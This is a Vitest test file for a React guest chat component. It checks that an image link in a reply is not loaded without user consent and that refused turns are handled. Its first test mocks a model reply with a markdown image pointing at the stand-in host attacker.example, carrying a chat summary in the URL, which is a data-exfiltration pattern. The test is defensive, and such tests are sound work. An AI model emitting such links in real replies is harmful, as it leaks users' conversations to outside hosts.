import type React from 'react';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

type GuestChatStreamModule = typeof import('./guest-chat-stream');

const ATTACKER_HOST = 'attacker.example';
const REPLY_IMAGE_URL = `https://${ATTACKER_HOST}/p?d=summary-of-the-chat`;
const REPLY = `Here is your summary.\n\n![chart](${REPLY_IMAGE_URL})`;
const ASSET_TIMEOUT_MS = 15_000;

const refusal = vi.hoisted(() => ({ code: null as string | null }));

vi.mock('./guest-chat-stream', async (importOriginal) => {
  const original = await importOriginal<GuestChatStreamModule>();
  return {
    ...original,
    sendGuestTurn: async (
      _messages: unknown,
      _signal: AbortSignal,
      onText: (content: string) => void,
    ) => {
      if (refusal.code) {
        throw new original.GuestChatRefusal(
          'Refused for now.',
          refusal.code as ConstructorParameters<typeof original.GuestChatRefusal>[1],
        );
      }
      onText(REPLY);
      return { content: REPLY, failure: null, remaining: 4 };
    },
  };
});

vi.mock('next/link', () => ({
  default: ({
    children,
    href,
    className,
  }: {
    children: React.ReactNode;
    href: string;
    className?: string;
  }) => (
    <a href={href} className={className}>
      {children}
    </a>
  ),
}));

const { GuestChat } = await import('./GuestChat');

describe('GuestChat', () => {
  it(
    'asks before loading an image that a guest reply points at',
    async () => {
      const user = userEvent.setup();
      const { container } = render(
        <GuestChat dailyLimit={5} signInHref="/login" signUpHref="/sign-up" />,
      );

      await user.type(screen.getByRole('textbox', { name: 'Message input' }), 'Summarise it');
      await user.keyboard('{Enter}');

      const load = await screen.findByRole(
        'button',
        { name: `Load image from ${ATTACKER_HOST}` },
        { timeout: ASSET_TIMEOUT_MS },
      );
      expect(container.querySelector(`img[src="${REPLY_IMAGE_URL}"]`)).toBeNull();
      expect(container.innerHTML).not.toContain(`${ATTACKER_HOST}/p`);

      await user.click(load);

      const image = container.querySelector(`img[src="${REPLY_IMAGE_URL}"]`);
      expect(image?.getAttribute('src')).toBe(REPLY_IMAGE_URL);
      expect(image?.getAttribute('referrerpolicy')).toBe('no-referrer');
    },
    ASSET_TIMEOUT_MS * 2,
  );

  describe('a refused turn', () => {
    afterEach(() => {
      refusal.code = null;
    });

    it('keeps the composer and the draft when admission is only unavailable', async () => {
      refusal.code = 'guest_admission_unavailable';
      const user = userEvent.setup();
      render(<GuestChat dailyLimit={5} signInHref="/login" signUpHref="/sign-up" />);

      await user.type(screen.getByRole('textbox', { name: 'Message input' }), 'Hello again');
      await user.keyboard('{Enter}');

      expect(await screen.findByText('Refused for now.')).toBeTruthy();
      const composer = screen.getByRole('textbox', {
        name: 'Message input',
      }) as HTMLTextAreaElement;
      expect(composer.value).toBe('Hello again');
    });

    it('replaces the composer once the day’s capacity is spent', async () => {
      refusal.code = 'guest_capacity_reached';
      const user = userEvent.setup();
      render(<GuestChat dailyLimit={5} signInHref="/login" signUpHref="/sign-up" />);

      await user.type(screen.getByRole('textbox', { name: 'Message input' }), 'Hello again');
      await user.keyboard('{Enter}');

      expect(await screen.findByText('Refused for now.')).toBeTruthy();
      expect(screen.queryByRole('textbox', { name: 'Message input' })).toBeNull();
    });
  });
});
